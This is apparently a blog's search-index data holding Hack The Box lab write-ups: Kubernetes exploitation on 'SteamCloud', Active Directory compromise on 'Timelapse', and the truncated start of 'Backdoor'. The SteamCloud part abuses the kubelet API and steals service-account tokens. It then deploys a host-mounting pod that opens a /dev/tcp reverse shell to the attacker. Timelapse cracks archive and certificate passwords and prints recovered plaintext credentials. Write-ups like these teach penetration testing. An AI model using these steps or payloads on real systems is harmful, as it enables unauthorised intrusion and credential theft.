tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 2379/tcp open etcd-client 2380/tcp open etcd-server 8443/tcp open https-alt 10249/tcp open unknown 10250/tcp open unknown 10256/tcp open unknown â””â”€$ nmap -sV -sC -Pn -p22,2379,2380,8443,10249,10250,10256 10.10.11.133 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 18:48 BST Nmap scan report for 10.10.11.133 (10.10.11.133) Host is up (0.16s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA) | 256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA) |_ 256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519) 2379/tcp open ssl/etcd-client? | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2023-08-22T16:56:47 |_Not valid after: 2024-08-21T16:56:48 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ h2 2380/tcp open ssl/etcd-server? | tls-alpn: |_ h2 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2023-08-22T16:56:47 |_Not valid after: 2024-08-21T16:56:48 8443/tcp open ssl/https-alt |_ssl-date: TLS randomness does not represent time | tls-alpn: | h2 |_ http/1.1 | ssl-cert: Subject: commonName=minikube/organizationName=system:masters | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 | Not valid before: 2023-08-21T16:56:46 |_Not valid after: 2026-08-21T16:56:46 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 403 Forbidden | Audit-Id: f15a6d51-34b1-4d39-8da4-4ceb0f11d6f4 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 151a61c3-ebac-4505-9b4c-ec051a6bc238 | X-Kubernetes-Pf-Prioritylevel-Uid: beb11e57-7071-48e1-adcd-ed84580800b3 | Date: Tue, 22 Aug 2023 17:48:25 GMT | Content-Length: 212 | {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;forbidden: User \u0026#34;system:anonymous\u0026#34; cannot get path \u0026#34;/nice ports,/Trinity.txt.bak\u0026#34;\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;details\u0026#34;:{},\u0026#34;code\u0026#34;:403} | GetRequest: | HTTP/1.0 403 Forbidden | Audit-Id: 0cf5de81-a588-4ef6-a99a-ec85aa73c024 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 151a61c3-ebac-4505-9b4c-ec051a6bc238 | X-Kubernetes-Pf-Prioritylevel-Uid: beb11e57-7071-48e1-adcd-ed84580800b3 | Date: Tue, 22 Aug 2023 17:48:23 GMT | Content-Length: 185 | {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;forbidden: User \u0026#34;system:anonymous\u0026#34; cannot get path \u0026#34;/\u0026#34;\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;details\u0026#34;:{},\u0026#34;code\u0026#34;:403} | HTTPOptions: | HTTP/1.0 403 Forbidden | Audit-Id: f0a058c6-4e86-431e-b38a-161f09c1237c | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 151a61c3-ebac-4505-9b4c-ec051a6bc238 | X-Kubernetes-Pf-Prioritylevel-Uid: beb11e57-7071-48e1-adcd-ed84580800b3 | Date: Tue, 22 Aug 2023 17:48:24 GMT | Content-Length: 189 |_ {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;forbidden: User \u0026#34;system:anonymous\u0026#34; cannot options path \u0026#34;/\u0026#34;\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;details\u0026#34;:{},\u0026#34;code\u0026#34;:403} |_http-title: Site doesn\u0026#39;t have a title (application/json). 10249/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). | ssl-cert: Subject: commonName=steamcloud@1692723410 | Subject Alternative Name: DNS:steamcloud | Not valid before: 2023-08-22T15:56:49 |_Not valid after: 2024-08-21T15:56:49 | tls-alpn: | h2 |_ http/1.1 |_ssl-date: TLS randomness does not represent time 10256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=8/22%Time=64E4F50B%P=x86_64-pc-linux-gn SF:u%r(GetRequest,22F,\u0026#34;HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nAudit-Id:\\x200cf5d SF:e81-a588-4ef6-a99a-ec85aa73c024\\r\\nCache-Control:\\x20no-cache,\\x20priva SF:te\\r\\nContent-Type:\\x20application/json\\r\\nX-Content-Type-Options:\\x20n SF:osniff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\x20151a61c3-ebac-4505-9b4c-ec SF:051a6bc238\\r\\nX-Kubernetes-Pf-Prioritylevel-Uid:\\x20beb11e57-7071-48e1- SF:adcd-ed84580800b3\\r\\nDate:\\x20Tue,\\x2022\\x20Aug\\x202023\\x2017:48:23\\x20 SF:GMT\\r\\nContent-Length:\\x20185\\r\\n\\r\\n{\\\u0026#34;kind\\\u0026#34;:\\\u0026#34;Status\\\u0026#34;,\\\u0026#34;apiVersion\\ SF:\u0026#34;:\\\u0026#34;v1\\\u0026#34;,\\\u0026#34;metadata\\\u0026#34;:{},\\\u0026#34;status\\\u0026#34;:\\\u0026#34;Failure\\\u0026#34;,\\\u0026#34;message\\\u0026#34;:\\\u0026#34;forbidden SF::\\x20User\\x20\\\\\\\u0026#34;system:anonymous\\\\\\\u0026#34;\\x20cannot\\x20get\\x20path\\x20\\\\\\\u0026#34;/ SF:\\\\\\\u0026#34;\\\u0026#34;,\\\u0026#34;reason\\\u0026#34;:\\\u0026#34;Forbidden\\\u0026#34;,\\\u0026#34;details\\\u0026#34;:{},\\\u0026#34;code\\\u0026#34;:403}\\n\u0026#34;)%r(HTTP SF:Options,233,\u0026#34;HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nAudit-Id:\\x20f0a058c6-4e8 SF:6-431e-b38a-161f09c1237c\\r\\nCache-Control:\\x20no-cache,\\x20private\\r\\nC SF:ontent-Type:\\x20application/json\\r\\nX-Content-Type-Options:\\x20nosniff\\ SF:r\\nX-Kubernetes-Pf-Flowschema-Uid:\\x20151a61c3-ebac-4505-9b4c-ec051a6bc SF:238\\r\\nX-Kubernetes-Pf-Prioritylevel-Uid:\\x20beb11e57-7071-48e1-adcd-ed SF:84580800b3\\r\\nDate:\\x20Tue,\\x2022\\x20Aug\\x202023\\x2017:48:24\\x20GMT\\r\\n SF:Content-Length:\\x20189\\r\\n\\r\\n{\\\u0026#34;kind\\\u0026#34;:\\\u0026#34;Status\\\u0026#34;,\\\u0026#34;apiVersion\\\u0026#34;:\\\u0026#34;v1\\ SF:\u0026#34;,\\\u0026#34;metadata\\\u0026#34;:{},\\\u0026#34;status\\\u0026#34;:\\\u0026#34;Failure\\\u0026#34;,\\\u0026#34;message\\\u0026#34;:\\\u0026#34;forbidden:\\x20Us SF:er\\x20\\\\\\\u0026#34;system:anonymous\\\\\\\u0026#34;\\x20cannot\\x20options\\x20path\\x20\\\\\\\u0026#34;/\\\\\\ SF:\u0026#34;\\\u0026#34;,\\\u0026#34;reason\\\u0026#34;:\\\u0026#34;Forbidden\\\u0026#34;,\\\u0026#34;details\\\u0026#34;:{},\\\u0026#34;code\\\u0026#34;:403}\\n\u0026#34;)%r(FourOhF SF:ourRequest,24A,\u0026#34;HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nAudit-Id:\\x20f15a6d51- SF:34b1-4d39-8da4-4ceb0f11d6f4\\r\\nCache-Control:\\x20no-cache,\\x20private\\r SF:\\nContent-Type:\\x20application/json\\r\\nX-Content-Type-Options:\\x20nosni SF:ff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\x20151a61c3-ebac-4505-9b4c-ec051a SF:6bc238\\r\\nX-Kubernetes-Pf-Prioritylevel-Uid:\\x20beb11e57-7071-48e1-adcd SF:-ed84580800b3\\r\\nDate:\\x20Tue,\\x2022\\x20Aug\\x202023\\x2017:48:25\\x20GMT\\ SF:r\\nContent-Length:\\x20212\\r\\n\\r\\n{\\\u0026#34;kind\\\u0026#34;:\\\u0026#34;Status\\\u0026#34;,\\\u0026#34;apiVersion\\\u0026#34;:\\\u0026#34; SF:v1\\\u0026#34;,\\\u0026#34;metadata\\\u0026#34;:{},\\\u0026#34;status\\\u0026#34;:\\\u0026#34;Failure\\\u0026#34;,\\\u0026#34;message\\\u0026#34;:\\\u0026#34;forbidden:\\x2 SF:0User\\x20\\\\\\\u0026#34;system:anonymous\\\\\\\u0026#34;\\x20cannot\\x20get\\x20path\\x20\\\\\\\u0026#34;/nice SF:\\x20ports,/Trinity\\.txt\\.bak\\\\\\\u0026#34;\\\u0026#34;,\\\u0026#34;reason\\\u0026#34;:\\\u0026#34;Forbidden\\\u0026#34;,\\\u0026#34;details\\\u0026#34; SF::{},\\\u0026#34;code\\\u0026#34;:403}\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 121.78 seconds Port 8443 TLS information: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 Looks like kubernetes-related We also have kurbenetes ports that are listed in docs The instance could be a minikube based on TLS info Port 8443 is default port minikube\u0026rsquo;s API https://minikube.sigs.k8s.io/docs/commands/start/ Foothold/User I installed kubectl But it prompts for auth We can check Kubelet API on port 10250 But we need to install kubeletctl We can see that nginx is in default namespace Trying to exec We could also run to check for rce in pods kubeletctl -s 10.10.11.133 scan rce â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ kubeletctl -s 10.10.11.133 exec \u0026#34;id\u0026#34; -p nginx -c nginx uid=0(root) gid=0(root) groups=0(root) We are root Let\u0026rsquo;s check /root folder and get a flag â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ kubeletctl -s 10.10.11.133 exec \u0026#34;ls -lha /root\u0026#34; -p nginx -c nginx total 12K drwxr-xr-x 2 root root 4.0K Nov 30 2021 . drwxr-xr-x 1 root root 4.0K Aug 23 17:03 .. -rw-r--r-- 2 root root 33 Aug 23 17:02 user.txt â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ kubeletctl -s 10.10.11.133 exec \u0026#34;cat /root/user.txt\u0026#34; -p nginx -c nginx e0c0**************************** Root We can get shell using exec: Based on this post â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ kubeletctl -s 10.10.11.133 exec \u0026#34;/bin/bash\u0026#34; -p nginx -c nginx root@nginx:/# Let\u0026rsquo;s enumerate Follow this post Also this post We need to look for Service Account tokens Service Account is an object managed by Kubernetes and used to provide an identity for processes that run in a pod Token could be located in: /run/secrets/kubernetes.io/serviceaccount /var/run/secrets/kubernetes.io/serviceaccount /secrets/kubernetes.io/serviceaccount contain the files: ca.crt: It\u0026rsquo;s the ca certificate to check kubernetes communications namespace: It indicates the current namespace token: It contains the service token of the current pod. root@nginx:/# ls -lha /run/secrets/kubernetes.io/serviceaccount ls -lha /run/secrets/kubernetes.io/serviceaccount total 4.0K drwxrwxrwt 3 root root 140 Aug 23 17:51 . drwxr-xr-x 3 root root 4.0K Aug 23 17:03 .. drwxr-xr-x 2 root root 100 Aug 23 17:51 ..2023_08_23_17_51_13.026865304 lrwxrwxrwx 1 root root 31 Aug 23 17:51 ..data -\u0026gt; ..2023_08_23_17_51_13.026865304 lrwxrwxrwx 1 root root 13 Aug 23 17:03 ca.crt -\u0026gt; ..data/ca.crt lrwxrwxrwx 1 root root 16 Aug 23 17:03 namespace -\u0026gt; ..data/namespace lrwxrwxrwx 1 root root 12 Aug 23 17:03 token -\u0026gt; ..data/token root@nginx:/# ls -lha /var/run/secrets/kubernetes.io/serviceaccount ls -lha /var/run/secrets/kubernetes.io/serviceaccount total 4.0K drwxrwxrwt 3 root root 140 Aug 23 17:51 . drwxr-xr-x 3 root root 4.0K Aug 23 17:03 .. drwxr-xr-x 2 root root 100 Aug 23 17:51 ..2023_08_23_17_51_13.026865304 lrwxrwxrwx 1 root root 31 Aug 23 17:51 ..data -\u0026gt; ..2023_08_23_17_51_13.026865304 lrwxrwxrwx 1 root root 13 Aug 23 17:03 ca.crt -\u0026gt; ..data/ca.crt lrwxrwxrwx 1 root root 16 Aug 23 17:03 namespace -\u0026gt; ..data/namespace lrwxrwxrwx 1 root root 12 Aug 23 17:03 token -\u0026gt; ..data/token Save ca.crt kubeletctl -s 10.10.11.133 exec \u0026quot;cat /run/secrets/kubernetes.io/serviceaccount/ca.crt\u0026quot; -p nginx -c nginx \u0026gt; ca.crt Set token export token=$(kubeletctl -s 10.10.11.133 exec \u0026quot;cat /run/secrets/kubernetes.io/serviceaccount/token\u0026quot; -p nginx -c nginx) Now we can use kubectl using the token â””â”€$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod NAME READY STATUS RESTARTS AGE nginx 1/1 Running 0 89m We can list the permissions of the default Service account â””â”€$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token auth can-i --list Resources Non-Resource URLs Resource Names Verbs selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] pods [] [] [get create list] [/.well-known/openid-configuration] [] [get] [/api/*] [] [get] [/api] [] [get] [/apis/*] [] [get] [/apis] [] [get] [/healthz] [] [get] [/healthz] [] [get] [/livez] [] [get] [/livez] [] [get] [/openapi/*] [] [get] [/openapi] [] [get] [/openid/v1/jwks] [] [get] [/readyz] [] [get] [/readyz] [] [get] [/version/] [] [get] [/version/] [] [get] [/version] [] [get] [/version] [] [get] We can get, create, and list pods Let\u0026rsquo;s follow this examples and create malicious pod https://cloudsecdocs.com/container_security/offensive/attacks/techniques/reverse_shell/ apiVersion: v1 kind: Pod metadata: name: pentest-pod01 namespace: default spec: containers: - name: pentest-pod01 image: nginx:1.14.2 command: [\u0026#34;/bin/bash\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.5/6666 0\u0026gt;\u0026amp;1\u0026#34;] volumeMounts: - mountPath: /mnt name: hostfs volumes: - name: hostfs hostPath: path: / automountServiceAccountToken: true hostNetwork: true Let\u0026rsquo;s start it â””â”€$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token apply -f evilpod.yaml pod/pentest-pod01 created Check nc listener Now we can add public key to authorized_keys and ssh to box ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/steamcloud/images/steamcloud.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/steamcloud/","summary":"SteamCloud Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.133 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 17:58 BST Nmap scan report for 10.10.11.133 (10.10.11.133) Host is up (0.15s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 2379/tcp open etcd-client 2380/tcp open etcd-server 8443/tcp open https-alt 10249/tcp open unknown 10250/tcp open unknown 10256/tcp open unknown â””â”€$ nmap -sV -sC -Pn -p22,2379,2380,8443,10249,10250,10256 10.10.11.133 -T4 Starting Nmap 7.","tags":["HTB","kubernetes","minikube","kubectl","kubeletctl","container"],"title":"[HTB] Machine: SteamCloud"},{"categories":null,"contents":"Timelapse Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.152 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 17:00 BST Nmap scan report for 10.10.11.152 (10.10.11.152) Host is up (0.094s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5986/tcp open wsmans 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49696/tcp open unknown 56502/tcp open unknown â””â”€$ nmap -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,46793,49674,49696,56502 -Pn 10.10.11.152 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 17:06 BST Nmap scan report for 10.10.11.152 (10.10.11.152) Host is up (0.17s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-25 00:05:47Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | ssl-cert: Subject: commonName=dc01.timelapse.htb | Not valid before: 2021-10-25T14:05:29 |_Not valid after: 2022-10-25T14:25:29 | tls-alpn: |_ http/1.1 |_http-title: Not Found |_ssl-date: 2023-08-25T00:07:22+00:00; +7h59m24s from scanner time. 9389/tcp open mc-nmf .NET Message Framing 46793/tcp filtered unknown 49667/tcp open msrpc Microsoft Windows RPC 49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49696/tcp open msrpc Microsoft Windows RPC 56502/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2023-08-25T00:06:44 |_ start_date: N/A |_clock-skew: mean: 7h59m23s, deviation: 0s, median: 7h59m22s Add dc01.timelapse.htb and timelapse.htb to /etc/hosts crackmapexec â””â”€$ crackmapexec smb dc01.timelapse.htb --shares -u test -p \u0026#39;\u0026#39; SMB timelapse.htb 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) SMB timelapse.htb 445 DC01 [+] timelapse.htb\\test: SMB timelapse.htb 445 DC01 [+] Enumerated shares SMB timelapse.htb 445 DC01 Share Permissions Remark SMB timelapse.htb 445 DC01 ----- ----------- ------ SMB timelapse.htb 445 DC01 ADMIN$ Remote Admin SMB timelapse.htb 445 DC01 C$ Default share SMB timelapse.htb 445 DC01 IPC$ READ Remote IPC SMB timelapse.htb 445 DC01 NETLOGON Logon server share SMB timelapse.htb 445 DC01 Shares READ SMB timelapse.htb 445 DC01 SYSVOL Logon server share smbclient â””â”€$ smbclient -N //10.10.11.152/Shares Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Oct 25 16:39:15 2021 .. D 0 Mon Oct 25 16:39:15 2021 Dev D 0 Mon Oct 25 20:40:06 2021 HelpDesk D 0 Mon Oct 25 16:48:42 2021 6367231 blocks of size 4096. 1270621 blocks available smb: \\\u0026gt; cd Dev smb: \\Dev\\\u0026gt; ls . D 0 Mon Oct 25 20:40:06 2021 .. D 0 Mon Oct 25 20:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 16:46:42 2021 6367231 blocks of size 4096. 1270528 blocks available smb: \\Dev\\\u0026gt; get winrm_backup.zip getting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec) smb: \\Dev\\\u0026gt; cd .. smb: \\\u0026gt; ls . D 0 Mon Oct 25 16:39:15 2021 .. D 0 Mon Oct 25 16:39:15 2021 Dev D 0 Mon Oct 25 20:40:06 2021 HelpDesk D 0 Mon Oct 25 16:48:42 2021 cd Help 6367231 blocks of size 4096. 1269473 blocks available smb: \\\u0026gt; cd HelpDesk smb: \\HelpDesk\\\u0026gt; ls . D 0 Mon Oct 25 16:48:42 2021 .. D 0 Mon Oct 25 16:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 15:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 15:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 15:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 15:57:44 2021 6367231 blocks of size 4096. 1269439 blocks available smb: \\HelpDesk\\\u0026gt; Foothold winrm_backup.zip is protected with password â””â”€$ unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password: skipping: legacyy_dev_auth.pfx incorrect password Let\u0026rsquo;s crack it zip2john winrm_backup.zip \u0026gt; winrm.hash â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt winrm.hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx) 1g 0:00:00:00 DONE (2023-08-24 17:22) 4.545g/s 15769Kp/s 15769Kc/s 15769KC/s surkerior..suppamas Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Unzip â””â”€$ unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password: inflating: legacyy_dev_auth.pfx Okay, we can follow this post If we try it, it\u0026rsquo;s protected with password â””â”€$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key Enter Import Password: Mac verify error: invalid password? Let\u0026rsquo;s crack this one too pfx2john legacyy_dev_auth.pfx \u0026gt; legacyy_dev_auth.hash â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.hash Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status thuglegacy (legacyy_dev_auth.pfx) 1g 0:00:00:58 DONE (2023-08-24 17:28) 0.01705g/s 55112p/s 55112c/s 55112C/s thuglife06..thug211 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Let\u0026rsquo;s try extracting key again â””â”€$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key Enter Import Password: Enter PEM pass phrase: Verifying - Enter PEM pass phrase: Decrypt it â””â”€$ openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth-decrypted.key Enter pass phrase for legacyy_dev_auth.key: writing RSA key Extract certificate â””â”€$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt Enter Import Password: Result â””â”€$ ls -lha legacyy_dev_auth* -rw------- 1 kali kali 1.3K Aug 24 17:33 legacyy_dev_auth.crt -rw------- 1 kali kali 1.7K Aug 24 17:33 legacyy_dev_auth-decrypted.key -rw-r--r-- 1 kali kali 5.0K Aug 24 17:27 legacyy_dev_auth.hash -rw------- 1 kali kali 2.1K Aug 24 17:29 legacyy_dev_auth.key -rwxr-xr-x 1 kali kali 2.5K Oct 25 2021 legacyy_dev_auth.pfx Let\u0026rsquo;s connect using evil-winrm evil-winrm -S -k legacyy_dev_auth-decrypted.key -c legacyy_dev_auth.crt -i timelapse.htb User Enumeration Let\u0026rsquo;s check Powershell History We have some creds svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV Let\u0026rsquo;s connect via evil-winrm evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S Root Enumerate svc_deploy is in LAPS_Readers group Let\u0026rsquo;s read LAPS password Get-AdComputer -Identity DC01 -property 'ms-mcs-admpwd' Administrator:e\u0026amp;5O591f8p30N8+C@yIY+3AE Let\u0026rsquo;s connect and get our flag ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/timelapse/images/timelapse.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/timelapse/","summary":"Timelapse Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.152 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 17:00 BST Nmap scan report for 10.10.11.152 (10.10.11.152) Host is up (0.094s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5986/tcp open wsmans 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49696/tcp open unknown 56502/tcp open unknown â””â”€$ nmap -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,46793,49674,49696,56502 -Pn 10.","tags":["HTB","active-directory","crackmapexec","smbclient","laps","zip2john","john","pfx2john","evil-winrm","winrm-keys","powershell-history"],"title":"[HTB] Machine: Timelapse"},{"categories":null,"contents":"Backdoor Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.125 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 18:07 BST Stats: 0:10:47 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 58.08% done; ETC: 18:25 (0:07:47 remaining) Nmap scan report for 10.10.11.125 (10.10.11.125) Host is up (0.16s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 1337/tcp open waste Nmap done: 1 IP address (1 host up) scanned in 1103.92 seconds â””â”€$ nmap -sV -Pn -p22,80,1337 10.10.11.125 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 18:44 BST Nmap scan report for 10.10.11.125 (10.10.11.125) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 1337/tcp open tcpwrapped Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds Web server gobuster â””â”€$ gobuster dir -u http://10.10.11.125 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.125 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/20 18:50:39 Starting gobuster in directory 